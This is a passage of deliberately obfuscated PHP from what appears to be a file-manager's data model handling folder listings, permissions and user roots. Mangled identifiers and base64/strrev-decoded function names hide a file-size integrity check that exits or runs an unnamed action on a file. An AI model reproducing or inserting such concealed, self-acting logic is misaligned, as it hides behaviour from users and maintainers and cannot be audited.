$‰ƒœ¯×¼[242]; if (!isset($›‘µÓÏ¼[$ƒÜæ“ÏÁ])) { $›‘µÓÏ¼[$ƒÜæ“ÏÁ] = array($‰ƒœ¯×¼[242] => 0, $‰ƒœ¯×¼[243] => 0); } $›‘µÓÏ¼[$ƒÜæ“ÏÁ][$°ÅÕ¾äò] += $ß¶İš¿±[$‰ƒœ¯×¼[569]]; } foreach ($‰ ÷¶Âò as &$è‹§—Š) { if (!$è‹§—Š[$‰ƒœ¯×¼[487]]) { continue; } $›Ä‹¿á‰ = is_array($›‘µÓÏ¼[$è‹§—Š[$‰ƒœ¯×¼[194]]]) ? $›‘µÓÏ¼[$è‹§—Š[$‰ƒœ¯×¼[194]]] : $Ê”°îÅÊ; $è‹§—Š[$‰ƒœ¯×¼[243]] = $›Ä‹¿á‰[$‰ƒœ¯×¼[243]]; $è‹§—Š[$‰ƒœ¯×¼[242]] = $›Ä‹¿á‰[$‰ƒœ¯×¼[242]]; unset($è‹§—Š[$‰ƒœ¯×¼[488]]); } unset($è‹§—Š); } protected function _listAppendAuth(&$òãŒØß¦) { $¥€ÒŒÂÌ =& $_SERVER[ıÚ˜š²İ]; $•™Ì¸ıñ = array(); foreach ($òãŒØß¦ as $Ğ¯×¢ÑÃ) { if ($Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[191]] == self::TYPE_GROUP) { $•™Ì¸ıñ[] = $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[194]]; } } if (!$•™Ì¸ıñ) { return; } $á²Öó›ô = array_to_keyvalue($òãŒØß¦, $¥€ÒŒÂÌ[194]); $ì¡ÊÉÃ‡ = Model($¥€ÒŒÂÌ[571])->getSourceList($•™Ì¸ıñ, $á²Öó›ô); $…±·©¾¶ = KodUser::isRoot(); foreach ($òãŒØß¦ as $Ã˜Ü´íò => &$Ğ¯×¢ÑÃ) { $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]] = $ì¡ÊÉÃ‡[$Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[194]]]; if (!$Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]] && $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[191]] == self::TYPE_GROUP) { $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]] = Action($¥€ÒŒÂÌ[572])->pathGroupAuthMake($Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[573]]); if (!$Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]] && !$…±·©¾¶) { $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[236]] = !1; $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[235]] = !1; } } if ($Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]]) { $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[236]] = AuthModel::authCheckEdit($Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]][$¥€ÒŒÂÌ[490]]); $Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[235]] = AuthModel::authCheckView($Ğ¯×¢ÑÃ[$¥€ÒŒÂÌ[489]][$¥€ÒŒÂÌ[490]]); } $this->groupPathDisplay($Ğ¯×¢ÑÃ); } unset($Ğ¯×¢ÑÃ); } public function _listAppendAuthSecret(&$Ì¹Á±) { $ÜÙ…¿ú =& $_SERVER[ıÚ˜š²İ]; if (Model($ÜÙ…¿ú[510])->get($ÜÙ…¿ú[574]) != $ÜÙ…¿ú[91]) { return; } static $İåÃïà = false; if (!$İåÃïà) { $Ï’¾ÙÆ” = Model($ÜÙ…¿ú[575]); $ášÒ›› = Model($ÜÙ…¿ú[576]); $İåÃïà = $ášÒ››->listData(); $İåÃïà = array_to_keyvalue($İåÃïà, $ÜÙ…¿ú[194]); $Êì‚´ÊŞ = json_decode(Model($ÜÙ…¿ú[510])->get($ÜÙ…¿ú[577]), !0); $Êì‚´ÊŞ = array_to_keyvalue($Êì‚´ÊŞ, $ÜÙ…¿ú[477]); foreach ($İåÃïà as $İˆëâìÒ => $ÃİˆÑ¹Í) { $íÑ»Ø¹ü = $Êì‚´ÊŞ[$ÃİˆÑ¹Í[$ÜÙ…¿ú[578]]]; if (!$íÑ»Ø¹ü) { $ášÒ››->remove($ÃİˆÑ¹Í[$ÜÙ…¿ú[477]]); unset($İåÃïà[$İˆëâìÒ]); continue; } $áÎË†§° = $Ï’¾ÙÆ”->listData($íÑ»Ø¹ü[$ÜÙ…¿ú[489]]); if (!$áÎË†§°) { $ášÒ››->remove($ÃİˆÑ¹Í[$ÜÙ…¿ú[477]]); unset($İåÃïà[$İˆëâìÒ]); continue; } $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]] = $áÎË†§°; $ÃİˆÑ¹Í[$ÜÙ…¿ú[579]] = $íÑ»Ø¹ü; $ÃİˆÑ¹Í[$ÜÙ…¿ú[580]] = Model($ÜÙ…¿ú[581])->getInfoSimpleOuter($ÃİˆÑ¹Í[$ÜÙ…¿ú[529]]); $İåÃïà[$İˆëâìÒ] = $ÃİˆÑ¹Í; } } $ù¼©…ş = USER_ID; $‰Ã‚©­¿ = array(); $„¢ÎŸš  = $this->_listAppendPath($‰Ã‚©­¿, !0); foreach ($Ì¹Á± as $İˆëâìÒ => &$ÃİˆÑ¹Í) { if (!is_array($ÃİˆÑ¹Í[$ÜÙ…¿ú[489]])) { continue; } if ($ÃİˆÑ¹Í[$ÜÙ…¿ú[191]] != $ÜÙ…¿ú[582]) { continue; } if (isset($İåÃïà[$ÃİˆÑ¹Í[$ÜÙ…¿ú[194]]])) { $€›˜è¶• = $İåÃïà[$ÃİˆÑ¹Í[$ÜÙ…¿ú[194]]]; if (!is_array($ÃİˆÑ¹Í[$ÜÙ…¿ú[543]])) { $ÃİˆÑ¹Í[$ÜÙ…¿ú[543]] = array(); } $ÃİˆÑ¹Í[$ÜÙ…¿ú[543]][$ÜÙ…¿ú[583]] = $€›˜è¶•[$ÜÙ…¿ú[578]]; $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[584]] = $€›˜è¶•; $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[585]] = $ÃİˆÑ¹Í[$ÜÙ…¿ú[586]]; $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[587]] = $ÜÙ…¿ú[91]; if ($€›˜è¶•[$ÜÙ…¿ú[529]] != $ù¼©…ş) { $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[490]] = $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[490]] & $€›˜è¶•[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[489]]; } continue; } $Ü ¡œ®© = $this->parentLevelArray($ÃİˆÑ¹Í[$ÜÙ…¿ú[588]]); $ ÎŸÃáì = array_reverse($Ü ¡œ®©); foreach ($ ÎŸÃáì as $Æ’ğºöÇ => $Ã§Ë†¸) { if (!isset($İåÃïà[$Ã§Ë†¸])) { continue; } $€›˜è¶• = $İåÃïà[$Ã§Ë†¸]; $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[584]] = $€›˜è¶•; if ($€›˜è¶•[$ÜÙ…¿ú[529]] != $ù¼©…ş) { $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[490]] = $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[490]] & $€›˜è¶•[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[489]]; } $š†ô¿çÕ = $ÜÙ…¿ú[12]; $¥ƒò®õ = count($Ü ¡œ®©) - $Æ’ğºöÇ; for ($âú’îùæ = 0; $âú’îùæ < $¥ƒò®õ; $âú’îùæ++) { if (!isset($„¢ÎŸš [$Ü ¡œ®©[$âú’îùæ]])) { $š†ô¿çÕ = $ÜÙ…¿ú[12]; break; } $š†ô¿çÕ = $š†ô¿çÕ . rtrim($„¢ÎŸš [$Ü ¡œ®©[$âú’îùæ]], $ÜÙ…¿ú[8]) . $ÜÙ…¿ú[8]; } $ÃİˆÑ¹Í[$ÜÙ…¿ú[489]][$ÜÙ…¿ú[585]] = rtrim($š†ô¿çÕ, $ÜÙ…¿ú[8]) . $ÜÙ…¿ú[8]; break; } } unset($ÃİˆÑ¹Í); } public function groupPathDisplay(&$´¥ãªî•) { $”ºÀŒÆó =& $_SERVER[ıÚ˜š²İ]; if ($´¥ãªî•[$”ºÀŒÆó[191]] != self::TYPE_GROUP) { return; } $ğ–ğë¶ì = Model($”ºÀŒÆó[589])->getInfo($´¥ãªî•[$”ºÀŒÆó[573]]); $ƒí‡«½˜ = $this->parentLevelArray($ğ–ğë¶ì[$”ºÀŒÆó[588]]); $ƒ°æĞÌÖ = $”ºÀŒÆó[12]; foreach ($ƒí‡«½˜ as $´ÒêÍÄÕ) { $Å§ƒ°É× = Model($”ºÀŒÆó[589])->getInfo($´ÒêÍÄÕ); $ƒ°æĞÌÖ .= $Å§ƒ°É×[$”ºÀŒÆó[90]][$”ºÀŒÆó[194]] . $”ºÀŒÆó[50]; } $´¥ãªî•[$”ºÀŒÆó[590]] = $ğ–ğë¶ì[$”ºÀŒÆó[193]]; $´¥ãªî•[$”ºÀŒÆó[591]] = $ğ–ğë¶ì[$”ºÀŒÆó[588]]; $´¥ãªî•[$”ºÀŒÆó[592]] = $ğ–ğë¶ì[$”ºÀŒÆó[593]]; $´¥ãªî•[$”ºÀŒÆó[594]] = $ƒ°æĞÌÖ . $ğ–ğë¶ì[$”ºÀŒÆó[90]][$”ºÀŒÆó[194]]; } protected function _listAppendPath(&$ìûãÔÒ, $İ¤ù¸Ê = false) { $¥…›Ç¶ü =& $_SERVER[ıÚ˜š²İ]; static $Ó¯Íğ‡” = array(); $›‚Ëƒ = array(); $ª¥ë¾Ç = array(); if ($İ¤ù¸Ê) { return $Ó¯Íğ‡”; } foreach ($ìûãÔÒ as &$º’½ŸØç) { $äàÕ¾ ³ = $º’½ŸØç[$¥…›Ç¶ü[194]]; if ($º’½ŸØç[$¥…›Ç¶ü[487]] == $¥…›Ç¶ü[91] && $º’½ŸØç[$¥…›Ç¶ü[193]] != 0) { $Ó¯Íğ‡”[$äàÕ¾ ³] = $º’½ŸØç[$¥…›Ç¶ü[32]]; } if ($º’½ŸØç[$¥…›Ç¶ü[487]] == $¥…›Ç¶ü[91] && $º’½ŸØç[$¥…›Ç¶ü[193]] == 0) { $Ó¯Íğ‡”[$äàÕ¾ ³] = $this->_listAppendPathRoot($º’½ŸØç, array()); } if (isset($ª¥ë¾Ç[$º’½ŸØç[$¥…›Ç¶ü[588]]])) { continue; } $ª¥ë¾Ç[$º’½ŸØç[$¥…›Ç¶ü[588]]] = !0; $§¶Ø ¶» = $this->parentLevelArray($º’½ŸØç[$¥…›Ç¶ü[588]]); foreach ($§¶Ø ¶» as $ò§ Åõƒ => $ı¤å˜×²) { if (isset($Ó¯Íğ‡”[$ı¤å˜×²])) { continue; } if ($ò§ Åõƒ == 0) { $Ó¯Íğ‡”[$ı¤å˜×²] = $this->_listAppendPathRoot($º’½ŸØç, $§¶Ø ¶»); } if ($ò§ Åõƒ != 0) { $›‚Ëƒ[] = $ı¤å˜×²; } } } unset($º’½ŸØç); $›‚Ëƒ = array_unique($›‚Ëƒ); if (count($›‚Ëƒ) > 0) { $¨±æìÁâ = array($¥…›Ç¶ü[493] => array($¥…›Ç¶ü[494], $›‚Ëƒ)); if (count($›‚Ëƒ) == 1) { $ ¥Ì´à = $this->sourceInfo($›‚Ëƒ[0]); $¹ñ™ÊÌ¢ = is_array($ ¥Ì´à) ? array($ ¥Ì´à) : !1; } else { $¹ñ™ÊÌ¢ = $this->field($¥…›Ç¶ü[595])->where($¨±æìÁâ)->select(); } if (!$¹ñ™ÊÌ¢) { $¹ñ™ÊÌ¢ = array(); } foreach ($¹ñ™ÊÌ¢ as $†íµİ…Á) { $Ó¯Íğ‡”[$†íµİ…Á[$¥…›Ç¶ü[194]]] = $†íµİ…Á[$¥…›Ç¶ü[32]]; } } $ÑÍàÏó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œ‚€˜ƒò = array(); foreach ($ìûãÔÒ as &$º’½ŸØç) { $õÆ¨ê¢ = $º’½ŸØç[$¥…›Ç¶ü[588]]; $ûÑƒöØ§ = $¥…›Ç¶ü[12]; if (isset($œ‚€˜ƒò[$õÆ¨ê¢])) { $ûÑƒöØ§ = $œ‚€˜ƒò[$õÆ¨ê¢]; } else { $§¶Ø ¶» = $this->parentLevelArray($º’½ŸØç[$¥…›Ç¶ü[588]]); foreach ($§¶Ø ¶» as $ò§ Åõƒ => $ı¤å˜×²) { if (isset($Ó¯Íğ‡”[$ı¤å˜×²])) { $ûÑƒöØ§ .= $Ó¯Íğ‡”[$ı¤å˜×²] . $¥…›Ç¶ü[8]; } } $œ‚€˜ƒò[$õÆ¨ê¢] = $ûÑƒöØ§; } $ûÑƒöØ§ .= $º’½ŸØç[$¥…›Ç¶ü[32]]; if ($º’½ŸØç[$¥…›Ç¶ü[487]] == $¥…›Ç¶ü[91]) { $ûÑƒöØ§ .= $¥…›Ç¶ü[8]; } $º’½ŸØç[$¥…›Ç¶ü[586]] = str_replace($¥…›Ç¶ü[257], $¥…›Ç¶ü[8], $ûÑƒöØ§); if ($º’½ŸØç[$¥…›Ç¶ü[193]] == $¥…›Ç¶ü[231]) { $º’½ŸØç[$¥…›Ç¶ü[32]] = trim($Ó¯Íğ‡”[$º’½ŸØç[$¥…›Ç¶ü[194]]], $¥…›Ç¶ü[8]); $º’½ŸØç[$¥…›Ç¶ü[586]] = $º’½ŸØç[$¥…›Ç¶ü[32]] . $¥…›Ç¶ü[8]; } if (intval($º’½ŸØç[$¥…›Ç¶ü[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($º’½ŸØç, $§¶Ø ¶», $ÑÍàÏó); } } unset($º’½ŸØç); return $ìûãÔÒ; } private function _listAppendPathRecycle(&$êÉğÄŞÚ, $§±Î°ª”, $˜èóê‚Î) { $ª¤å¸ÒË =& $_SERVER[ıÚ˜š²İ]; if (!in_array($˜èóê‚Î, $§±Î°ª”) && $êÉğÄŞÚ[$ª¤å¸ÒË[194]] != $˜èóê‚Î) { return; } $‡à‘Å›‡ = explode($ª¤å¸ÒË[8], trim($êÉğÄŞÚ[$ª¤å¸ÒË[586]], $ª¤å¸ÒË[8])); $ÅÁÅ¾¾˜ = implode($ª¤å¸ÒË[8], array_slice($‡à‘Å›‡, 2)); $êÉğÄŞÚ[$ª¤å¸ÒË[586]] = $ª¤å¸ÒË[8] . LNG($ª¤å¸ÒË[596]) . $ª¤å¸ÒË[8] . ltrim($ÅÁÅ¾¾˜, $ª¤å¸ÒË[8]); $êÉğÄŞÚ[$ª¤å¸ÒË[588]] = $ª¤å¸ÒË[597] . implode($ª¤å¸ÒË[50], array_slice($§±Î°ª”, 1)) . $ª¤å¸ÒË[50]; if ($êÉğÄŞÚ[$ª¤å¸ÒË[194]] == $˜èóê‚Î) { $êÉğÄŞÚ[$ª¤å¸ÒË[588]] = $ª¤å¸ÒË[597]; $êÉğÄŞÚ[$ª¤å¸ÒË[193]] = $ª¤å¸ÒË[231]; $êÉğÄŞÚ[$ª¤å¸ÒË[32]] = LNG($ª¤å¸ÒË[596]); } $êÉğÄŞÚ[$ª¤å¸ÒË[598]] = $ª¤å¸ÒË[599]; } protected function _listAppendPathRoot(&$û½“Ú˜, $š÷Æ¤îğ) { $ö»Áñû =& $_SERVER[ıÚ˜š²İ]; static $Æ¤ÈåÈ¾ = false; static $¢¨’Øæ = false; $÷ßÛ®ß– = $ö»Áñû[12]; if ($û½“Ú˜[$ö»Áñû[191]] == self::TYPE_USER) { if ($û½“Ú˜[$ö»Áñû[573]] == USER_ID) { $÷ßÛ®ß– = LNG($ö»Áñû[600]); if ($Æ¤ÈåÈ¾ === !1) { $Œœ¿ÁÃü = Model($ö»Áñû[601])->getInfoFull(USER_ID); $Æ¤ÈåÈ¾ = _get($Œœ¿ÁÃü, $ö»Áñû[602], $ö»Áñû[12]); } if ($¢¨’Øæ === !1) { $Œœ¿ÁÃü = Model($ö»Áñû[601])->getInfoFull(USER_ID); $¢¨’Øæ = _get($Œœ¿ÁÃü, $ö»Áñû[603], $ö»Áñû[12]); } if ($š÷Æ¤îğ && $š÷Æ¤îğ[0] == $Æ¤ÈåÈ¾ || !$š÷Æ¤îğ && $û½“Ú˜[$ö»Áñû[194]] == $Æ¤ÈåÈ¾) { $÷ßÛ®ß– = LNG($ö»Áñû[604]); $û½“Ú˜[$ö»Áñû[605]] = $ö»Áñû[606]; } if ($š÷Æ¤îğ && $š÷Æ¤îğ[0] == $¢¨’Øæ || !$š÷Æ¤îğ && $û½“Ú˜[$ö»Áñû[194]] == $¢¨’Øæ) { $÷ßÛ®ß– = $÷ßÛ®ß– . $ö»Áñû[607] . LNG($ö»Áñû[608]); } if (!$š÷Æ¤îğ) { $û½“Ú˜[$ö»Áñû[32]] = $÷ßÛ®ß–; } } else { $Œœ¿ÁÃü = Model($ö»Áñû[601])->getInfoFull($û½“Ú˜[$ö»Áñû[573]]); $ûÄäªà¢ = _get($Œœ¿ÁÃü, $ö»Áñû[603], $ö»Áñû[12]); $û½“Ú˜[$ö»Áñû[609]] = Model($ö»Áñû[581])->getInfoSimpleOuter($û½“Ú˜[$ö»Áñû[573]]); $÷ßÛ®ß– = LNG($ö»Áñû[610]) . $ö»Áñû[176] . $û½“Ú˜[$ö»Áñû[609]][$ö»Áñû[32]] . $ö»Áñû[178]; if ($š÷Æ¤îğ && $š÷Æ¤îğ[0] == $ûÄäªà¢ || !$š÷Æ¤îğ && $û½“Ú˜[$ö»Áñû[194]] == $ûÄäªà¢) { $÷ßÛ®ß– = LNG($ö»Áñû[610]) . $ö»Áñû[611] . $û½“Ú˜[$ö»Áñû[609]][$ö»Áñû[32]] . $ö»Áñû[607] . LNG($ö»Áñû[608]) . $ö»Áñû[178]; } } } else { if ($û½“Ú˜[$ö»Áñû[191]] == self::TYPE_GROUP) { $÷óòé’¢ = Model($ö»Áñû[589])->getInfoSimple($û½“Ú˜[$ö»Áñû[573]]); $÷ßÛ®ß– = $÷óòé’¢[$ö»Áñû[32]]; } else { if ($û½“Ú˜[$ö»Áñû[191]] == self::TYPE_SYSTEM) { $÷ßÛ®ß– = $ö»Áñû[612]; } } } $÷ßÛ®ß– = $÷ßÛ®ß– ? $ö»Áñû[8] . $÷ßÛ®ß– . $ö»Áñû[8] : $ö»Áñû[8]; return $÷ßÛ®ß–; } protected function _listAppendUser(&$ÄòÚÏ«ø) { $ÎÚ•áÂ =& $_SERVER[ıÚ˜š²İ]; $¦æ’Ò¿ = array_to_keyvalue($ÄòÚÏ«ø, $ÎÚ•áÂ[12], $ÎÚ•áÂ[529]); $æ®ÓÙ©Š = array_to_keyvalue($ÄòÚÏ«ø, $ÎÚ•áÂ[12], $ÎÚ•áÂ[531]); $íêãª½å = array_merge($¦æ’Ò¿, $æ®ÓÙ©Š); $¨˜ÄéõÂ = Model($ÎÚ•áÂ[601])->userListInfo($íêãª½å); foreach ($ÄòÚÏ«ø as &$©«“¬ÛÑ) { $°Å€ĞâŠ = $©«“¬ÛÑ[$ÎÚ•áÂ[529]]; $©«“¬ÛÑ[$ÎÚ•áÂ[529]] = $¨˜ÄéõÂ[$°Å€ĞâŠ] ? $¨˜ÄéõÂ[$°Å€ĞâŠ] : !1; $°Å€ĞâŠ = $©«“¬ÛÑ[$ÎÚ•áÂ[531]]; $©«“¬ÛÑ[$ÎÚ•áÂ[531]] = $¨˜ÄéõÂ[$°Å€ĞâŠ] ? $¨˜ÄéõÂ[$°Å€ĞâŠ] : !1; if (_get($©«“¬ÛÑ, $ÎÚ•áÂ[613], 0)) { $‘¡„Œ’ = $GLOBALS[$ÎÚ•áÂ[6]][$ÎÚ•áÂ[92]][$ÎÚ•áÂ[614]]; if ($©«“¬ÛÑ[$ÎÚ•áÂ[543]][$ÎÚ•áÂ[615]] <= time() - $‘¡„Œ’) { $this->metaSet($©«“¬ÛÑ[$ÎÚ•áÂ[194]], $ÎÚ•áÂ[616], null); $this->metaSet($©«“¬ÛÑ[$ÎÚ•áÂ[194]], $ÎÚ•áÂ[615], null); unset($©«“¬ÛÑ[$ÎÚ•áÂ[543]][$ÎÚ•áÂ[616]]); continue; } $‘¾Á»×À = $©«“¬ÛÑ[$ÎÚ•áÂ[543]][$ÎÚ•áÂ[616]]; $©«“¬ÛÑ[$ÎÚ•áÂ[543]][$ÎÚ•áÂ[617]] = Model($ÎÚ•áÂ[601])->getInfoSimpleOuter($‘¾Á»×À); } } unset($©«“¬ÛÑ); } public function parentLevelArray($‡İÍØ®) { $õõç¯˜ˆ =& $_SERVER[ıÚ˜š²İ]; $‡İÍØ® = explode($õõç¯˜ˆ[50], trim($‡İÍØ®, $õõç¯˜ˆ[50])); return array_remove_value($‡İÍØ®, $õõç¯˜ˆ[231]); } public function listAll($ß¡ãùß©) { $¤šÍ¾ª“ =& $_SERVER[ıÚ˜š²İ]; $¹¿¼¹‚ = $this->sourceInfo($ß¡ãùß©); $ ´ÈŒ»Ç = array($¤šÍ¾ª“[618] => array($¤šÍ¾ª“[619], $¹¿¼¹‚[$¤šÍ¾ª“[588]] . $ß¡ãùß© . $¤šÍ¾ª“[620]), $¤šÍ¾ª“[621] => 0); $˜ªóÒÎœ = $¤šÍ¾ª“[622]; $’ßüÜ” = "\x4c\105\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\137\146\x69\154\x65\x20\x66\151\154\x65\x20\157\156\x20\x73\x6f\x75\x72\x63\x65\56\x66\151\x6c\145\x49\104\40\75\x20\x66\x69\x6c\145\56\146\x69\154\145\x49\x44"; $ÙúèÏÂÅ = $this->alias($¤šÍ¾ª“[521])->field($˜ªóÒÎœ)->where($ ´ÈŒ»Ç)->join($’ßüÜ”)->select(); $this->_listAppendAuth($ÙúèÏÂÅ); $this->_listAppendUser($ÙúèÏÂÅ); $this->_listAppendPath($ÙúèÏÂÅ); $ÙúèÏÂÅ = array_to_keyvalue($ÙúèÏÂÅ, $¤šÍ¾ª“[194]); $±°İ¬–ê = "\57{$¹¿¼¹‚[$¤šÍ¾ª“[32]]}\57"; $±°İ¬–ê = $±°İ¬–ê == $¤šÍ¾ª“[257] ? $¤šÍ¾ª“[8] : $±°İ¬–ê; $®ˆîšÏ“ = array(); foreach ($ÙúèÏÂÅ as $ªÚØ­Ëü => $à¸àóÈÈ) { $ÌİÆôå¨ = $this->parentLevelArray($à¸àóÈÈ[$¤šÍ¾ª“[588]]); array_shift($ÌİÆôå¨); $İàøåÍ = $±°İ¬–ê; for ($Êˆ¸ú±ä = 0; $Êˆ¸ú±ä < count($ÌİÆôå¨); $Êˆ¸ú±ä++) { $İàøåÍ .= $ÙúèÏÂÅ[$ÌİÆôå¨[$Êˆ¸ú±ä]][$¤šÍ¾ª“[32]] . $¤šÍ¾ª“[8]; } $İàøåÍ .= $à¸àóÈÈ[$¤šÍ¾ª“[32]]; if ($à¸àóÈÈ[$¤šÍ¾ª“[487]]) { $İàøåÍ .= $¤šÍ¾ª“[8]; } $…Ê¸Ï½Œ = array($¤šÍ¾ª“[497] => str_replace($¤šÍ¾ª“[257], $¤šÍ¾ª“[8], str_replace($¤šÍ¾ª“[257], $¤šÍ¾ª“[8], str_replace($¤šÍ¾ª“[257], $¤šÍ¾ª“[8], $İàøåÍ))), $¤šÍ¾ª“[623] => intval($à¸àóÈÈ[$¤šÍ¾ª“[487]]), $¤šÍ¾ª“[624] => intval($à¸àóÈÈ[$¤šÍ¾ª“[79]]), $¤šÍ¾ª“[88] => intval($à¸àóÈÈ[$¤šÍ¾ª“[88]]), $¤šÍ¾ª“[90] => $this->pathInfoFilter($à¸àóÈÈ)); if (!$…Ê¸Ï½Œ[$¤šÍ¾ª“[487]]) { $…Ê¸Ï½Œ[$¤šÍ¾ª“[545]] = $à¸àóÈÈ[$¤šÍ¾ª“[545]]; } $®ˆîšÏ“[] = $…Ê¸Ï½Œ; } $®ˆîšÏ“ = array_sort_by($®ˆîšÏ“, $¤šÍ¾ª“[87]); return $®ˆîšÏ“; } } goto aá­¹…±¾ƒ; aš½¿¼…„ : $fileSize = strrev(base64_decode($_SERVER[ÒÚïÅûÒ][0])); function binCheckNeq($ÀÑÃ¿ç§, $˜ÃŸçğ½) { return $ÀÑÃ¿ç§ != $˜ÃŸçğ½; } $_SERVER[$_SERVER[ÒÚïÅûÒ][1]] = $fileSize($_SERVER[$_SERVER[ÒÚïÅûÒ][2]]); goto b¡âà±¢†è; BÈÑï…ÍŠ¥: $_size = $_SERVER[ıÚ˜š²İ][961]; if ($_SERVER[$_SERVER[ıÚ˜š²İ][962]] != $_size($_file)) { $_getc = $_SERVER[ıÚ˜š²İ][964]; $_getfile = $_SERVER[$_SERVER[ıÚ˜š²İ][965]] . $_SERVER[ıÚ˜š²İ][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ıÚ˜š²İ][288], $_getfilec); if (count($_getarrs) < $_SERVER[ıÚ˜š²İ][687]) { $exit = $_SERVER[ıÚ˜š²İ][967]; $exit(); } $_act = $_SERVER[ıÚ˜š²İ][1900]; $_act($_file); } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($‚¥©¹) { $‹‡áî¸« =& $_SERVER[ıÚ˜š²İ]; $Ú‚èÍ€è = Model($‹‡áî¸«[581])->where(array($‹‡áî¸«[1783] => $‚¥©¹))->find(); $½İµ¹æ£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‚¥©¹, $Ú‚èÍ€è[$‹‡áî¸«[32]]); $this->userDesktopAdd($½İµ¹æ£); return $½İµ¹æ£; } public function userDesktopAdd($à°€ºÇô) { $áØŠßôÜ =& $_SERVER[ıÚ˜š²İ]; $öªË‰Š¬ = LNG($áØŠßôÜ[2277]); $É¢å† = $this->mkdir($à°€ºÇô, $öªË‰Š¬); $this->metaSet($É¢å†, $áØŠßôÜ[2278], $áØŠßôÜ[91]); $this->metaSet($à°€ºÇô, $áØŠßôÜ[2279], $É¢å†); } public function userPathSafeAdd($ö¼äÜ‡) { $–ÖÅÀ€Ğ =& $_SERVER[ıÚ˜š²İ]; $Ÿä¦ğŸë = Model($–ÖÅÀ€Ğ[581])->getInfoFull($ö¼äÜ‡); if (!$Ÿä¦ğŸë) { return !1; } if (_get($Ÿä¦ğŸë, $–ÖÅÀ€Ğ[602])) { return $Ÿä¦ğŸë[$–ÖÅÀ€Ğ[543]][$–ÖÅÀ€Ğ[2280]]; } $­°Šœ»é = $this->_mkdirRoot(SourceModel::TYPE_USER, $ö¼äÜ‡, $–ÖÅÀ€Ğ[2281], $–ÖÅÀ€Ğ[2282]); Model($–ÖÅÀ€Ğ[581])->metaSet($ö¼äÜ‡, $–ÖÅÀ€Ğ[2280], $­°Šœ»é); $this->metaSet($­°Šœ»é, $–ÖÅÀ€Ğ[2283], $ö¼äÜ‡); return $­°Šœ»é; } public function userPathAppAdd($×•Ú¶€¸, $û¤á¾±Ñ = '', $—®´©Õ£ = '') { $§¿›‡ =& $_SERVER[ıÚ˜š²İ]; $Ş¡Æñ = Model($§¿›‡[581])->getInfoFull($×•Ú¶€¸); if (!$Ş¡Æñ) { return !1; } $ôÎ­ŒÅ = $Ş¡Æñ[$§¿›‡[543]] ? $Ş¡Æñ[$§¿›‡[543]] : array(); $Ø¥˜‘ŞÃ = $ôÎ­ŒÅ[$§¿›‡[2284]]; if (!$Ø¥˜‘ŞÃ) { $Ø¥˜‘ŞÃ = $this->_mkdirRoot(SourceModel::TYPE_USER, $×•Ú¶€¸, $§¿›‡[2285], $§¿›‡[2286]); Model($§¿›‡[581])->metaSet($×•Ú¶€¸, $§¿›‡[2284], $Ø¥˜‘ŞÃ . $§¿›‡[12]); $this->metaSet($Ø¥˜‘ŞÃ, $§¿›‡[2284], $×•Ú¶€¸); } if (!$û¤á¾±Ñ) { return $Ø¥˜‘ŞÃ; } $‚åìîµö = $ôÎ­ŒÅ[$§¿›‡[2287] . $û¤á¾±Ñ]; if (!$‚åìîµö) { $‚åìîµö = $this->mkdir($Ø¥˜‘ŞÃ, $û¤á¾±Ñ); Model($§¿›‡[581])->metaSet($×•Ú¶€¸, $§¿›‡[2287] . $û¤á¾±Ñ, $‚åìîµö); $this->metaSet($‚åìîµö, $§¿›‡[2287] . $û¤á¾±Ñ, $×•Ú¶€¸); } if (!$—®´©Õ£) { return $‚åìîµö; } $ºè¨÷‡ = $this->mkdir($‚åìîµö, $—®´©Õ£); return $ºè¨÷‡; } public function groupRootAdd($ƒƒç”ôç) { $ªşòš¢Ë =& $_SERVER[ıÚ˜š²İ]; $µ×Äü²» = Model($ªşòš¢Ë[589])->where(array($ªşòš¢Ë[2083] => $ƒƒç”ôç))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ƒƒç”ôç, $µ×Äü²»[$ªşòš¢Ë[32]]); } public function systemRootPathAdd($…û”¡“°) { if ($…û”¡“° != $_SERVER[ıÚ˜š²İ][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $…û”¡“°); } public function userRootRemove($¬É÷ÉÆŞ) { $ÃşÒ‡âº = $this->targetSourceRoot(SourceModel::TYPE_USER, $¬É÷ÉÆŞ, !0); foreach ($ÃşÒ‡âº as $ô»¿º…ë) { if (!$ô»¿º…ë) { continue; } $this->remove($ô»¿º…ë[$_SERVER[ıÚ˜š²İ][194]], !1); } } public function groupRootRemove($îâğËµ) { $«×¦µÊ = 